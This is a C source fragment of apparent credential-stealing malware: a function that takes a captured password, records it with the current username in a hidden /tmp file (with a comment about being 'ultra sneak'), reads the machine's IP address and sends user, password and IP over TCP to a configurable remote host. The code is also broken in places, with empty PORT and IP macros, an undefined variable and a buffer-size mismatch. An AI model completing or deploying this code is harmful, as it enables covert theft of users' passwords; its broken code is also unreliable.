#include <sys/socket.h>
#include <arpa/inet.h> 
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h> 
#include <string.h> 
#define PORT 
#define IP 


# Function
int writetofile (char *password){

    // Get UID
    uid_t uid = geteuid();
    struct passwd * pw = getpwuid(uid);
        
    // Create File + Variables
    FILE * fptr;
    fptr = fopen("/tmp/18432443.tmp", "a"); // Remove for ultra sneak
    char * user;
    char * msg;
    char * msg2;
    char * colon;

    // Write Shit
    if (pw) {
        user = pw->pw_name;
    }
    else {
        user = "unknown";
    }

    if (fptr != NULL) {

        fprintf(fptr, "%s:%s\n", name, password);
            
        // Get IP Address //
        int fd;
        struct ifreq ifr;
        fd = socket(AF_INET, SOCK_DGRAM, 0);
        
        /* I want to get an IPv4 IP address */
        ifr.ifr_addr.sa_family = AF_INET;

        /* I want IP address attached to "eth0" */
        strncpy(ifr.ifr_name, "#INT", IFNAMSIZ-1);
        ioctl(fd, SIOCGIFADDR, &ifr);
        close(fd);
        
        /* display result */
        char buffer[256];
        char * ip;
        strcpy(user, name);
        ip = printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
        int j = snprintf(buffer, 1024, "%s:%s:%s\n", user, password, ip);
        
        // // Send stuff // //
        // Make Socket
        int sock = 0, valread;
        struct sockaddr_in serv_addr;


        fclose(fptr);

        // Error Handling
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            return -1;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);
            
        struct timeval timeout;
        timeout.tv_sec = 3;
        timeout.tv_usec = 0;

        if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
            return -1;
        }
            
        if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
            // pass
        }


        // Error Handling
        if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
            return -1;
        }
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            return -1;
        }

        // Send Message
        send(sock , buffer , strlen(buffer) , 0 );
        return 0;
    }

    return 0;
}